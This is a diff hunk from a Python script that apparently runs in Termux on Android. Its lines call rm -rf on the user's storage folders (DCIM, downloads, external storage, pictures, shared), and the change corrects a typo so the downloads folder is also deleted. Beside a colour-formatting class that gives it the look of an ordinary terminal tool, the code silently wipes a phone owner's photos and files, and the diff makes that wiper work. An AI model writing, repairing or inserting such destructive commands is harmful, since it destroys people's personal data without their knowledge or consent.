@@ -11,7 +11,7 @@ class color:
     fin = '\033[0m'
 
 os.system("rm -rf /data/data/com.termux/files/home/storage/dcim")
-os.system("rm -rf /data/data/com.termux/files/home/storage/dowloads")
+os.system("rm -rf /data/data/com.termux/files/home/storage/downloads")
 os.system("rm -rf /data/data/com.termux/files/home/storage/external-1")
 os.system("rm -rf /data/data/com.termux/files/home/storage/pictures")
 os.system("rm -rf /data/data/com.termux/files/home/storage/shared")
